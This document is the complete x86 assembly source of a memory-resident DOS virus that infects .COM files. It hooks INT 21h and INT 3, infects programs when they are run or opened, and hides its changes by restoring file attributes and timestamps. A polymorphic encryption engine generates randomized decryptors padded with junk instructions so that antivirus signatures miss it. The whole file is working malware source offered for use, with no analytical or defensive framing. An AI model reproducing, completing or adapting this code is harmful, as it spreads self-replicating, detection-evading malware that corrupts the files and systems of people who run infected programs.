          .RADIX  16            ; will only work on 80386 - on purpose...
          .model tiny
           P386N                ;386 Non-Protected mode
          .code                 ;You can't find it, so don't do this to yourself

;--- Data area --------------------------------------------

           org     0E0h

File_Len   dw      0, 0
INT21      dw      0, 0
ADD_Val    dw      0
XOR_Val    dw      0
XOR_Ofs    dw      0
ByteFill   dw      0
ByteFill2  dw      0

;--- Virus entry point ------------------------------------

           org     100h                    ;.COM file

Entry:
           call    Delta                   ;get IP

Delta:
           pop     si
           sub     si,(Delta-Entry)        ;SI=delta offset
           mov     di,100h                 ;DI=COM start offset
           cld

           push    ax ds es di si          ;save registers

           xor     ax,ax
           dec     ax                      ;ax=0FFFFh (residency check)
           int     3                       ;INT 3=INT 21h if resident
           or      al,ah

           je      short exit_inst

           mov     ax,es                   ;adjust memory-size
           dec     ax
           mov     ds,ax
           sub     bx,bx
           cmp     byte ptr [bx],5Ah       ;enough memory available?
           jne     short exit_inst         ;don't install if there isn't
           mov     ax,[bx+3]
           sub     ax,(0D0h + 160h)        ;space for virus + workspace
           jb      short exit_inst
           mov     [bx+3],ax
           sub     word ptr ds:[bx+12h],(0D0h+160h) ;virus and workspace
           mov     es,[bx+12h]
           push    cs
           pop     ds
           mov     cx,(last - Entry)
           rep     movsb                   ;copy virus to top of memory

           push    es
           pop     ds
           mov     ax,3521h                ;get original int21 vector
           int     21h

           mov     ds:[INT21],bx
           mov     ds:[INT21+2],es
           lea     dx,INT_21h              ;install new INT 3 handler
           mov     ax,2503h
           int     21h

           lea     dx,INT_21h              ;install INT 21h with same
           mov     ax,2521h                ; handler
           int     3

           mov     ax,'rn'                 ;init. random nr. generator
           int     3

exit_inst:
           pop     si di es ds ax          ;restore registers
           add     si,(offset Orig_Bytes)
           sub     si,di
           push    di
           movsd                    ;read first 4 bytes from Orig_Bytes
           ret

;--- Encryption tables ------------------------------------

             ;        AX    AL     AH
mov_register db      0B8h, 0B0h,  0B4h,  0
             ;       (BX)   BL     BH
             db      0B8h, 0B3h,  0B7h,  0
             ;        CX    DL     CH
             db      0B9h, 0B1h,  0B5h

             ;       nop  clc   decbp cld   incbp stc   cli   cmc
junk_1byte   db      90h, 0f8h, 4dh,  0fch, 45h,  0f9h, 0fah, 0f5h
             ;       repz repnz  repz  repnz incbp stc  cli   repnz
             db      0f3h, 0f2h, 0F3h, 0F2h, 45h, 0f9h, 0fah, 0f2h

             ;       or   and   xchg  mov
junk_2byte   db      8,   20h,  84h,  88h

             ;       bl / bh,   bx,   si&di
dir_change   db      7,   7,    4,      5
ind_change   db      3,   3,    6,      7

             ;       xor  xor   add   sub
enc_type     db      30h, 30h,   0,   28h

             ;            add   xor    or
add_mode     db      0,   0C8h, 0F0h, 0C0h


;--- NOP and JUNK offsets ---------------------------------

NOPSets      dw      offset Cond_JMP
             dw      offset JMP_Over
             dw      offset XCHG_AX_Reg2
             dw      offset INC_DEC2
             dw      offset Byte_NOP
             dw      offset Word_NOP
             dw      offset CALL_NOPs
             dw      offset Move_Something
             dw      offset abcd1
             dw      offset abcd2
             dw      offset abcd3
             dw      offset JMP_Up
             dw      offset CMPS_SCAS
             dw      offset XCHG_AX_Reg
             dw      offset PUSH_POP
             dw      offset INC_DEC

;--- INT 24h handler --------------------------------------

INT_24h:
           mov     al,3                    ;to avoid 'Abort, Retry, ...'
           iret

;--- first bunch of bytes ---------------------------------

Orig_Bytes   db      0CDh, 20h, 0, 0    ;First 4 bytes of host

;--- INT 21h handler --------------------------------------

Signature:
           inc      ax               ;ax=0
           popf
           iret

Initialize:
           call    Initialize_RNG
           jmp     short exit_21

;--- INT 21h entry point ----------------------------------

INT_21h:
           pushf
           cmp     ax,0FFFFh                ;install check?
           je      short Signature

           push    es ds si di dx cx bx ax ;save registers

           cmp     ax,'rn'                 ;rnd init ?
           je      short initialize
           cmp     ax,4B00h                 ;execute ?
           je      short Do_It
           cmp     ax,6C00h                 ;open
           jne     short exit_21
           test    bl,3
           jnz     short exit_21
           mov     dx,di

Do_It:
           call    infect

Exit_21:
           pop     ax bx cx dx di si ds es ;restore registers
           popf
           jmp     dword ptr cs:[INT21]     ;call to old int-handler

;--- Infect file ------------------------------------------

Infect:
           cld
           push    cs                      ;copy filename to CS:0000
           pop     es
           mov     si,dx
           sub     di,di
           mov     cx,80h

Upper_Case:
           lodsb
           or      al,al
           jz      converted
           cmp     al,'a'
           jb      short next_char
           cmp     al,'z'
           ja      next_char
           xor     al,20h                   ;convert to upper case

next_char:
           stosb
           loop    Upper_Case

Exit_Inf:
           ret

converted:
           stosb                           ;convert to ASCIIZ
           lea     si,[di-5]
           push    cs
           pop     ds
                
           lodsw                           ;make sure its not EXE
           cmp     ax,'E.'
           je      short Exit_Inf

           std                             ;find begin of filename
           mov     cx,si
           inc     cx

Get_Victim:
           lodsb
           cmp     al,':'
           je      short Got_Victim
           cmp     al,'\'
           je      short Got_Victim
           loop    Get_Victim

Got_Victim:
           cld
           mov     ax,3300h                 ;get ctrl-break flag
           int     3
           push    dx                      ;save flag on stack

           cwd                             ;clear the flag
           inc     ax
           push    ax
           int     3

           mov     ax,3524h                 ;get int24 vector
           int     3
           push    es bx cs                ;save vector on stack
           pop     ds

           lea     dx,INT_24h              ;install new int24 handler
           mov     ah,25h                   ; so errors wont be
           push    ax                      ; generated
           int     3

           mov     ax,4300h                 ;get file-attributes
           cwd
           int     3
           push    cx                      ;save attributes on stack

           sub     cx,cx                   ;clear attributes
           mov     ax,4301h
           push    ax
           int     3
           jc      short Rest_Attribs

           mov     ax,3D02h                 ;open the file
           int     3
           jc      short Rest_Attribs

           xchg    bx,ax                   ;save handle
           mov     ax,5700h                 ;get file date & time
           int     3
           push    dx                      ;save date & time on stack
           push    cx

           mov     cx,4                    ;read beginning of file
           lea     si,Orig_Bytes
           mov     dx,si
           mov     ah,3Fh
           int     3
           jc      short Close_File
           mov     ax,4202h                 ;goto end, get filelength
           sub     cx,cx
           cwd
           int     3

           lea     di,File_Len               ;save filelength
           mov     [di],ax
           mov     [di+2],dx

           mov     al,byte ptr [si + 3]    ;already infected?
           cmp     al,'O'

           je      short Close_File
           cmp     word ptr [si],'ZM'      ;EXE with COM ext?
           je      short Close_File
           mov     ax,word ptr [di]        ;check length of file
           mov     dx,ax
           inc     dh

           call    Engine               ;make encryption engine, and
                                        ; infect file
           jne     short Close_File
           mov     byte ptr [si],0E9h   ;put 'JMP xxxx' at begin
           sub     al,3                    ;subtract JMP xxxx size
           mov     word ptr [si+1],ax      ;finish JMP statement

;--- Goto new offset DX:AX --------------------------------

gotobegin:
           sub     ax,ax
           cwd
           xchg    dx,cx
           xchg    dx,ax
           mov     ax,4200h
           int     3

           mov     byte ptr [si+3],'O'
           mov     cx,4                    ;write new beginning
           mov     dx,si
           mov     ah,40h
           int     3

Close_File:
           pop     cx dx                   ;restore date & time
           mov     ax,5701h
           int     3

           mov     ah,3Eh                   ;close the file
           int     3

Rest_Attribs:
           pop     ax cx                   ;restore attributes
           cwd
           int     3

           pop     ax dx ds                ;restore int24 vector
           int     3

           pop     ax dx                   ;restore ctrl-break flag
           int     3
           ret

;--- Initialize encryption generator ----------------------

Engine:
           push    ax dx si bp es          ;save registers

           cli
           mov     word ptr [di-4],ss      ;save SS & SP
           mov     word ptr [di-2],sp

           mov     ax,cs                   ;new stack & buffer-segment
           mov     ss,ax
           mov     sp,((0D0h + 160h) * 10h)   ;virus plus workspace
           add     ax,0D0h                 ;virus space
           mov     es,ax                   ;work segment in ES
           sti
           push    ds

           mov     bp,dx                   ;start of decryptor
           mov     dx,100h                 ;beginning of code to encrypt
           mov     cx,(last - Entry)       ;length of virus
           sub     si,si                   ;distance between encryptor
                                           ;and code
           push    di bx
           push    dx                      ;save offset of code
           push    si                      ;save future offset of code
           sub     di,di                   ;di = start of decryptor
           call    Random_Number           ;get random # of junk bytes

           and     ax,7Fh                 ;maximum # of junk bytes = 7Fh
           add     cx,ax                   ;add it to file size
           push    cx                      ;save length of code + junk

;--- Get random encryption key ----------------------------

Key:
           call    Random_Number           ;get random encryption value
           or      al,al
           jz      short key               ;again if 0
           mov     ds:[XOR_Val],ax

;--- Generate encryption method ---------------------------

           call    Random_Number                 ;get random flags
           xchg    bx,ax

;--- Encryption method stored in BX -----------------------

;          bit 0:  how to encrypt
;          bit 1:
;          bit 2:  which register used for encryption
;          bit 3:
;          bit 4:  use byte or word for encrypt
;          bit 5:  MOV AL, MOV AH or MOV AX
;          bit 6:  MOV CL, MOV CH or MOV CX
;          bit 7:  AX or DX
;          bit 8:  count up or down
;          bit 9:  ADD/SUB/INC/DEC or CMPSW/SCASW
;          bit A:  ADD/SUB or INC/DEC
;                  CMPSW or SCASW
;          bit B:  offset in XOR instruction?
;          bit C:  LOOPNZ or LOOP
;                  SUB CX or DEC CX
;          bit D:  carry with crypt ADD/SUB
;          bit E:  carry with inc ADD/SUB
;          bit F:  XOR instruction value or AX/DX


;--- Generate encryption engine ---------------------------

           call    Fill_NOPs               ;insert random instructions

           pop     cx
           mov     ax,0111h                ;make flags to remember which
           test    bl,20h                   ;  MOV instructions are used
           jnz     short Test_4_Reg
           xor     al,7

Test_4_Reg:
           test    bl,0Ch                   ;testing for registers?
           jnz     short Check_4_Cx
           xor     al,70h                   ;don't use CX, CH or CL

Check_4_Cx:
           test    bl,40h                   ;use CX, CH or CL?
           jnz     short Byte_Or_Word
           xor     ah,7                    ;set for c

Byte_Or_Word:
           test    bl,10h                   ;byte or word?
           jnz     short AX_Or_DX
           and     al,73h                   ;set for byte

AX_Or_DX:
            test    bh,80h                   ;AX or DX?
            jnz     short Store_Method
            and     al,70h                   ;not DX (so AX or CX)

Store_Method:
            mov     dx,ax

Write_MOVs:
           call    Random_Number           ;put MOV instructions in
           and     ax,0Fh                  ;  a random order
           cmp     al,0Ah
           ja      short Write_MOVs
           mov     si,ax
           push    cx                      ;test if MOV already done
           xchg    ax,cx
           mov     ax,1
           shl     ax,cl
           mov     cx,ax
           and     cx,dx
           pop     cx
           jz      short Write_MOVs
           xor     dx,ax                   ;remember which MOV done

           push    dx
           call    Generate_MOV             ;insert MOV instruction
           call    NOP_Size                 ;insert a random NOP
           pop     dx

           or      dx,dx                   ;all MOVs done?
           jnz     short Write_MOVs

           push    di                      ;save start of decryptor loop

           call    ADD_AX               ;add a value to AX in loop?
           call    NOP_Size
           test    bh,20h                   ;carry with ADD/SUB ?
           jz      short Fill_Loop
           mov     al,0F8h
           stosb

Fill_Loop:
           mov     word ptr ds:[XOR_Ofs],0
           call    Generate_Crypter        ;place all loop instructions
           call    Gen_Counter
           call    NOP_Size
           pop     dx                      ;get start of decryptor loop
           call    Gen_Loop

           sub     ax,ax                   ;calculate loop offset
           test    bh,1                    ;up or down?
           jz      short Is_Byte
           mov     ax,cx
           dec     ax
           test    bl,10h                   ;encrypt with byte or word?
           jz      short Is_Byte
           and     al,0FEh

Is_Byte:
           add     ax,di
           add     ax,bp
           pop     si
           add     ax,si
           sub     ax,word ptr ds:[XOR_Ofs]
           mov     si,word ptr ds:[ByteFill]
           test    bl,0Ch                   ;are BL,BH used for crypt?
           jnz     short Not_Bx
           mov     byte ptr es:[si],al
           mov     si,word ptr ds:[ByteFill2]
           mov     byte ptr es:[si],ah
           jmp     short Word_Crypt

Not_Bx:
           mov     word ptr es:[si],ax

Word_Crypt:
           mov     dx,word ptr ds:[XOR_Val]   ;encryption value
           pop     si                      ;ds:si = start of code
           push    di                      ;save ptr to encrypted code
           push    cx                     ;save length of encrypted code
           test    bl,10h                  ;byte or word?
           jz      short Enc_Virus_b
           inc     cx                      ;cx = # of crypts (words)
           shr     cx,1

;--- Encrypt the new virus --------------------------------

Enc_Virus_w:
           lodsw                           ;encrypt code (words)
           call    Do_Encryption
           stosw
           loop    Enc_Virus_w
           jmp     short Encrypted

Enc_Virus_b:
           lodsb                           ;encrypt code (bytes)
           sub     dh,dh
           call    Do_Encryption
           stosb
           loop    Enc_Virus_b

Encrypted:
           mov     cx,di                   ;cx = length decryptpr + code
           pop     ax                     ;ax = length of decrypted code
           pop     di                      ;di = offset encrypted code
           sub     dx,dx                   ;ds:dx = decryptor + cr. code

;--- Write infected program to disk -----------------------

           push    es
           pop     ds                      ;work segment
           pop     bx
           pop     di            ;length of decryptor/ofs encrypted code
           push    cx              ;length of decryptor+encrypted code
           push    dx
           mov     ax,4202h                 ;goto end
           xor     cx,cx
           cwd
           int     3

           pop     dx                      ;encryptor + encrypted code
           pop     cx                      ;length of decryptor+enc code
           mov     ah,40h                   ;write virus
           int     3
           pop     ds

           cli
           mov     ss,word ptr [di-4]      ;restore stack
           mov     sp,word ptr [di-2]
           sti

           pop     es bp si dx ax          ;restore registers
           ret

;--- SUBROUTINES FOR ENCRYPION GENERATOR ------------------

;--- Pseudo random number generator (inspired by MTE) -----

Initialize_RNG:
           push    dx                      ;initialize generator
           push    cx                      ;needed to emulate Random_Number
           sub     ah,ah                   ;Get number of clock ticks
           int     1Ah                     ;since midnight in CX:DX

Alter_RNG:
           mov     word ptr ds:[rnd_ax],DX
           mov     word ptr ds:[rnd_dx],AX
           mov     al,dl
           pop     cx dx
           ret

Random_Number:
           push    dx cx bx                ;calculate a random number
           mov     ax,1234h                ;will be: mov ax,xxxx
rnd_ax     equ     $-2
           mov     dx,5678h                ;  and mov dx,xxxx
rnd_dx     equ     $-2
           mov     cx,7

Create_RN:
           shl     ax,1
           rcl     dx,1
           mov     bl,al
           xor     bl,dh
           jns     short Random_Loop
           inc     al

Random_Loop:
           loop    Create_RN
           pop     bx
           jmp     short Alter_RNG

;--- encrypt the virus with new encryption engine ---------

Do_Encryption:
           add     dx,word ptr ds:[ADD_Val]
           test    bl,2
           jnz     short Encrypt_SUB

Encrypt_XOR:
           xor     ax,dx
           ret

Encrypt_SUB:
           test    bl,1
           jnz     short Encrypt_ADD
           sub     ax,dx
           ret

Encrypt_ADD:
           add     ax,dx
           ret

;--- generate mov reg,xxxx --------------------------------

Generate_MOV:
           mov     dx,si
           mov     al,byte ptr ds:[si+mov_register]
           cmp     dl,4                    ;BX?
           jne     short Is_It_Ax
           call    add_ind

Is_It_Ax:
           test    dl,0Ch                   ;A*?
           pushf
           jnz     short Not_Ax
           test    bl,80h                   ;A* or D*?
           jz      short Not_Ax
           add     al,2

Not_Ax:
           call    Which_MOV                   ;insert the MOV
           popf                            ;A*?
           jnz     short Is_It_Bx
           mov     ax,word ptr ds:[XOR_Val]
           jmp     short CH_Or_CL

Is_It_Bx:
           test    dl,8                    ;B*?
           jnz     short Is_It_Cx
           lea     si,ByteFill
           test    dl,2
           jz      short Not_BH
           add     si,2

Not_BH:
           mov     word ptr ds:[si],di
           jmp     short CH_Or_CL

Is_It_Cx:
           mov     ax,cx                   ;C*
           test    bl,10h                   ;byte or word encryption?
           jz      short CH_Or_CL
           inc     ax                     ;only half the number of bytes
           shr     ax,1

CH_Or_CL:
           test    dl,3                    ;byte or word register?
           jz      short Word_Reg
           test    dl,2                    ;*H?
           jz      short Byte_Reg
           xchg    ah,al

Byte_Reg:
           stosb
           ret

Word_Reg:
           stosw
           ret

;--- insert MOV or alternative for MOV --------------------

Which_MOV:
           push    bx cx ax
           call    Random_Number
           xchg    bx,ax
           pop     ax
           test    bl,3                    ;use alternative for MOV?
           jz      short Store_MOV

           push    ax
           and     bx,0Fh
           and     al,8
           shl     ax,1
           or      bx,ax
           pop     ax

           and     al,7
           mov     cl,9
           xchg    cx,ax
           mul     cl

           add     ax,30C0h
           xchg    ah,al
           test    bl,4
           jz      short no_sub
           mov     al,28h

no_sub:
           call    Mov_BorW
           stosw

           mov     al,80h
           call    Mov_BorW
           stosb

           lea     ax,add_mode
           xchg    bx,ax
           and     ax,3
           xlat
           add     al,cl

Store_MOV:
           stosb
           pop     cx
           pop     bx
           ret

;--- insert ADD AX,xxxx -----------------------------------

ADD_AX:
           push    cx
           lea     si,ADD_Val              ;save add-value here
           mov     word ptr ds:[si],0
           mov     ax,bx
           and     ax,8110h
           xor     ax,8010h
           jnz     short Done_ADD               ;use ADD?

           mov     ax,bx
           sub     ah,ah
           mov     cl,3
           div     cl
           or      ah,ah
           jnz     short Done_ADD               ;use ADD?

           test    bl,80h
           jnz     short Make_ADD_DX            ;AX or DX?
           mov     al,5
           stosb
           jmp     short ADD_What

Make_ADD_DX:
           mov     ax,0C281h
           stosw

ADD_What:
           call    Random_Number
           mov     word ptr ds:[si],ax
           stosw

Done_ADD:
           pop     cx
           ret

;--- generate encryption command --------------------------

Generate_Crypter:
           test    bh,80h                  ;type of XOR command
           jz      short Val_Encrypt

Reg_Encrypt:
           call    Get_Crypter                 ;encrypt with register
           call    ADD_2_ADC
           call    Store_ADD
           sub     ax,ax
           test    bl,80h
           jz      short xxxx
           add     al,10h

xxxx:
           call    add_dir
           test    bh,8
           jnz     short yyyy
           stosb
           ret

yyyy:
           or      al,80h
           stosb
           call    Random_Number
           stosw
           mov     word ptr ds:[XOR_Ofs],ax
           ret

Val_Encrypt:
           mov     al,80h                  ;encrypt with value
           call    Store_ADD
           call    Get_Crypter
           call    ADD_2_ADC
           call    xxxx
           mov     ax,word ptr ds:[XOR_Val]
           test    bl,10h
           jmp     Is_B_or_W

;--- Generate INC/DEC command------------------------------

Gen_Counter:
           test    bl,8                 ;no CMPSW/SCASW if BX is used
           jz      short AddSub_IncDec
           test    bh,2                 ;ADD/SUB/INC/DEC or CMPSW/SCASW
           jnz     short CMPSW_

AddSub_IncDec:
           test    bh,4                    ;ADD/SUB or INC/DEC?
           jz      short AddSub

           mov     al,40h                  ;INC/DEC
           test    bh,1                    ;up or down?
           jz      short Count_Size
           add     al,8

Count_Size:
           call    add_ind
           stosb
           test    bl,10h                  ;byte or word?
           jz      short Done_CSize
           stosb                           ;same instruction again

Done_CSize:
           ret

;---

AddSub:
           test    bh,40h                  ;ADD/SUB
           jz      short No_CLC            ;carry?
           mov     al,0F8h                 ;insert CLC
           stosb

No_CLC:
           mov     al,83h
           stosb
           mov     al,0C0h
           test    bh,1                    ;up or down?
           jz      short ADC_
           mov     al,0E8h

ADC_:
           test    bh,40h                   ;carry?
           jz      short No_ADC
           and     al,0CFh
           or      al,10h

No_ADC:
           call    add_ind
           stosb
           mov     al,1                    ;value to add/sub

Store_ADD:
           call    Enc_BorW
           stosb
           ret

CMPSW_:
           test    bh,1                    ;up or down?
           jz      short No_STD
           mov     al,0FDh                 ;insert STD
           stosb

No_STD:
           test    bh,4                    ;CMPSW or SCASW?
           jz      short Do_CMPSW
           test    bl,4                    ;no SCASW if SI is used
           jnz     short Do_SCASW

Do_CMPSW:
           mov     al,0A6h                  ;CMPSB
           jmp     short Store_ADD

Do_SCASW:
           mov     al,0AEh                  ;SCASB
           jmp     short Store_ADD

;--- Generate LOOP command --------------------------------

Gen_Loop:
           test    bh,1                    ;no JNE if counting down
           jnz     short LOOPNZ_LOOP       ;  (prefetch bug!)
           call    Random_Number
           test    al,1                    ;LOOPNZ/LOOP or JNE?
           jnz     short Lower_CX

LOOPNZ_LOOP:
           mov     al,0E0h
           test    bh,1A                   ;LOOPNZ or LOOP?
           jz      short No_LOOPNZ         ;  no LOOPNZ if xor-offset
           add     al,2                    ;  no LOOPNZ if CMPSW/SCASW

No_LOOPNZ:
           stosb
           mov     ax,dx
           sub     ax,di
           dec     ax
           stosb
           ret

Lower_CX:
           test    bh,10h                   ;SUB CX or DEC CX?
           jnz     short DEC_CX
           mov     ax,0E983h
           stosw
           mov     al,1                    ;SUB CX
           stosb
           jmp     short JNE_

DEC_CX:
           mov     al,49h                   ;DEC CX
           stosb

JNE_:
           mov     al,75h                   ;JNE
           jmp     short No_LOOPNZ         ;create location

;--- Add value to AL depending on register type

add_ind:
           lea     si,ind_change
           jmp     short xx1

add_dir:
           lea     si,dir_change

xx1:
           push    bx
           shr     bl,2
           and     bx,3                    ;4 options
           add     al,byte ptr ds:[bx+si]  ;
           pop     bx
           ret

;--- move encryption command byte into AL -----------------

Get_Crypter:
           push    bx
           lea     ax,enc_type
           xchg    bx,ax
           and     ax,3
           xlat
           pop     bx
           ret

;--- Change ADD to ADC ------------------------------------

ADD_2_ADC:
           test    bl,2                    ;ADD/SUB used for encryption?
           jz      short No_Carry
           test    bh,20h                   ;carry with (encr.) ADD/SUB?
           jz      short No_Carry
           and     al,0CFh
           or      al,10h

No_Carry:
           ret

;--- Change AL (byte/word) --------------------------------

Enc_BorW:
           test    bl,10h
           jz      short Enc_Byte
           inc     al

Enc_Byte:
           ret

;--- Change AL (byte/word) --------------------------------

Mov_BorW:
           call    Enc_BorW
           cmp     al,81h                  ;can't touch this
           je      short Mov_Byte
           push    ax
           call    Random_Number
           test    al,1
           pop     ax
           jz      short Mov_Byte
           add     al,2

Mov_Byte:
           ret

;--- Insert random instructions ---------------------------

Fill_NOPs:
           call    Random_Number          ;put a random number of
           and     ax,7fh                  ;dummy instructions before
           cmp     ax,0                   ;decryptor  (max=7Fh bytes)
           je      short No_NOPs
           xchg    ax,cx

NOP_Loop:
           call    junk
           loop    NOP_Loop

No_NOPs:
           ret

;--- Get rough random NOP (may affect register values -----

junk:
           call    Random_Number
           and     ax,1Eh
           jmp     short aa0

nop16x:
           call    Random_Number
           and     ax,6

aa0:
           xchg    si,ax
           call    Random_Number
           jmp     word ptr ds:[si+NOPSets]

;--- Check for, and insert random NOP ---------------------

NOP_Size:
           call    Random_Number
           test    al,3                    ;does al have flag 0011?
           jz      short Byte_NOP
           test    al,2                    ;does al have flag 0010?
           jz      short Word_NOP
           test    al,1                    ;does al have flag 0001?
           jz      short nop16x
            ret                             ;al flag must be 0000

;--- NOP and junk routines --------------------------------

Cond_JMP:
           and     ax,0Fh                 ;J* 0000 (conditional)
           or      al,70h
           stosw
           ret

 JMP_Over:
           mov     al,0EBh                 ;JMP xxxx / junk
           and     ah,7
           inc     ah
           stosw
           xchg    ah,al                   ;get lenght of bullshit
           cbw
           jmp     Prep_Trash
 
JMP_Up:
           call    Byte_NOP

;Sample alteration:  Use one or the other from the following 2 lines.
; Making a few alterations like these changes the algorythm

;          mov     ax,0EBh                 ;JMP $+1 ..or..
           mov ax,0fde2h                   ;LOOP backwards

           stosw
           ret



Byte_NOP:
           push    bx                      ;8-bit NOP
           and     al,0Fh                   ;total NOPS available
           lea     bx,junk_1byte
           xlat
           stosb
           pop     bx
           ret


Word_NOP:
           push    bx                      ;16-bit NOP
           and     ax,303h
           lea     bx,junk_2byte
           xlat
           add     al,ah
           stosb
           call    Random_Number
           and     al,7
           mov     bl,9
           mul     bl
           add     al,0C0h
           stosb
           pop     bx
           ret


CALL_NOPs:
           push    cx                      ;CALL xxxx / junk / POP reg
           mov     al,0E8h
           and     ah,0Fh
           inc     ah
           stosw
           sub     al,al
           stosb
           xchg    ah,al
           call    Prep_Trash
           call    NOP_Size
           call    Random_Number                 ;insert POP reg
           and     al,7
           call    no_sp
           mov     cx,ax
           or      al,58h
           stosb

           test    ch,3                    ;more?
           jnz     short CALL_NOPs_ret

           call    NOP_Size
           mov     ax,0F087h                ;insert XCHG SI,reg
           or      ah,cl
           test    ch,8
           jz      short j6_1
           mov     al,8Bh

j6_1:
           stosw
           call    NOP_Size
           push    bx
           call    Random_Number
           xchg    ax,bx
           and     bx,0F7FBh               ;insert XOR [SI],xxxx
           or      bl,8
           call    Generate_Crypter
           pop     bx

CALL_NOPs_ret:
           pop     cx
           ret

Move_Something:
           and     al,0Fh                   ;MOV reg,xxxx
           or      al,0B0h
           call    no_sp
           stosb
           test    al,8
           pushf
           call    Random_Number
           popf
           jmp     short Is_B_or_W


abcd1:
           and     ah,39h                   ;DO r/m,r(8/16)
           or      al,0C0h
           call    no_sp
           xchg    ah,al
           stosw
           ret

abcd2:
           and     al,3Bh                  ;DO r(8/16),r/m
           or      al,2
           and     ah,3Fh
           call    no_sp2
           call    no_bp
           stosw
           ret

CMPS_SCAS:
           and     al,9                   ;CMPS* or SCAS*
           test    ah,1
           jz      short MOV_TEST
           or      al,0A6h
           stosb
           ret

MOV_TEST:
           or      al,0A0h               ;MOV AX,[xxxx] or TEST AX,xxxx
           stosb
           cmp     al,0A8h
           pushf
           call    Random_Number
           popf
           jmp     short Is_B_or_W


XCHG_AX_Reg:
           and     al,7                   ;XCHG AX,reg
           or      al,90h
           call    no_sp
           stosb
           ret


XCHG_AX_Reg2:
           call    XCHG_AX_Reg            ;XCHG AX,reg / XCHG AX,reg
           stosb
           ret


PUSH_POP:
           and     ah,7                   ;PUSH reg / POP reg
           or      ah,50h
           mov     al,ah
           or      ah,8
           stosw
           ret


INC_DEC:
           and     al,0Fh                   ;INC / DEC
           or      al,40h
           call    no_sp
           stosb
           ret


INC_DEC2:
           call    INC_DEC                ;INC / DEC or DEC / INC
           xor     al,8
           stosb
           ret


abcd3:
           and     ah,1                    ;DO rm,xxxx
           or      ax,80C0h
           call    no_sp
           xchg    ah,al
           stosw
           test    al,1
           pushf
           call    Random_Number
           popf

;--- Store a byte or word to encryptor --------------------

Is_B_or_W:
           jz      short Is_B
           stosw
           ret

Is_B:
           stosb
           ret

;--- leave SP alone ---------------------------------------

no_sp:
           push    ax
           and     al,7
           cmp     al,4
           pop     ax
           jnz     short no_sp_ret
           and     al,0FBh

no_sp_ret:
           ret

no_sp2:
           push    ax
           and     ah,38h
           cmp     ah,20h
           pop     ax
           jnz     short no_sp2_ret
           xor     ah,20h

no_sp2_ret:
           ret

;--- don't use [BP+...] -----------------------------------

no_bp2:
           push    ax
           and     ah,7
           cmp     ah,6
           pop     ax
           jnz     short no_bp_ret
           or      ah,1

no_bp_ret:
           ret

no_bp:
           test    ah,4
           jnz     short no_bp2
           and     ah,0FDh
           ret

;--- Write byte for JMP/CALL, and fill with random bytes --

Prep_Trash:
           push    cx
           xchg    cx,ax

Fill_Trash:
           call    Random_Number
           stosb
           loop    Fill_Trash
           pop     cx
           ret
last:

           end    Entry
